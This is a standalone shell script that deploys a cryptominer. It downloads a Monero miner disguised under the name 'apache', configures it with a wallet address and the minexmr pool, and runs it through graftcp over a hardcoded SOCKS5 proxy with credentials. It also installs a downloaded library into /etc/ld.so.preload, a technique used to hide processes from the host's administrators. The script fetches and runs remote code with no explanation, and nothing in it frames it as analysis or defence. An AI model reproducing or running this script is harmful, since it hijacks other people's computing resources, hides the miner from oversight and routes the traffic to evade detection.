#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
apt update
apt -y install binutils cmake build-essential screen unzip net-tools curl nano gcc

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 51.79.243.155:2082
socks5_username = sshocean-denrio
socks5_password = 111
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

git clone https://github.com/scatterfafafa/lib.git
cd lib;make
sudo mv libOmptarget.so /usr/local/lib/;echo /usr/local/lib/libOmptarget.so >> /etc/ld.so.preload
cd ..

wget https://gitlab.com/scatterfafafa/asuw/-/raw/main/apache
chmod 700 apache
cd ..

cat > config.ini <<END
[RandomX]
wallet = 85kGog3Jb3b2dDLUjqqiA7isnxgRCupTrFYMJo8HLoKPcYVk5thUveKAeiYhUigE18McDneZYhLnvFPnNydVhSmw8XEK72B
rigName = sairin
cpuThreads=14
pool1 = sg.minexmr.com:4444
END


./graftcp/graftcp ./apache
